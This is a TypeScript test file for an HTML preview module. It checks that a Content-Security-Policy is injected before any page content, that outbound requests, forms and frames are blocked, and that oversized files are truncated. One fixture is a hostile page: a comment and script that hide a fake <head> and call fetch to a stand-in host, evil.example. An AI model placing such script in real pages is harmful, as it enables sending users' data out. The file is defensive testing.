import { test } from "node:test";

import assert from "node:assert/strict";

import {
  MAX_PREVIEW_BYTES,
  PREVIEWABLE,
  PREVIEW_CSP,
  previewDocument,
} from "../lib/preview.ts";


test("only web pages get a preview", () => {
  for (const name of ["landing.html", "Index.HTM", "page.v2.html"]) {
    assert.ok(PREVIEWABLE.test(name), name);
  }

  for (const name of ["notes.md", "data.json", "landing.html.txt", "html"]) {
    assert.ok(!PREVIEWABLE.test(name), name);
  }
});


test("the policy comes before anything the page wrote", () => {
  const page = `<!doctype html><html><head><title>Hi</title></head><body><h1>Hello</h1></body></html>`;

  const doc = previewDocument(page);

  assert.ok(doc.startsWith("<!doctype html><meta charset=\"utf-8\"><meta http-equiv=\"Content-Security-Policy\""));
  assert.ok(doc.indexOf("Content-Security-Policy") < doc.indexOf("<title>"));
  assert.ok(doc.includes("<h1>Hello</h1>"));
});


test("a fake <head> hidden in a comment or script cannot get ahead of it", () => {
  const sneaky = `<!-- <head> --><script>var s = "<head>"; fetch("https://evil.example")</script><p>x</p>`;

  const doc = previewDocument(sneaky);

  assert.equal(doc.indexOf("Content-Security-Policy") < doc.indexOf("<!--"), true);
});


test("the page can show itself but cannot send anything anywhere", () => {
  assert.match(PREVIEW_CSP, /connect-src 'none'/);
  assert.match(PREVIEW_CSP, /form-action 'none'/);
  assert.match(PREVIEW_CSP, /frame-src 'none'/);
  assert.match(PREVIEW_CSP, /base-uri 'none'/);
  assert.match(PREVIEW_CSP, /default-src 'none'/);

  // ...while a normal landing page still renders.
  assert.match(PREVIEW_CSP, /style-src 'unsafe-inline'/);
  assert.match(PREVIEW_CSP, /img-src https:/);
});


test("a huge file is cut to the preview limit", () => {
  const doc = previewDocument("x".repeat(MAX_PREVIEW_BYTES + 5000));

  assert.ok(doc.length < MAX_PREVIEW_BYTES + 1000);
});
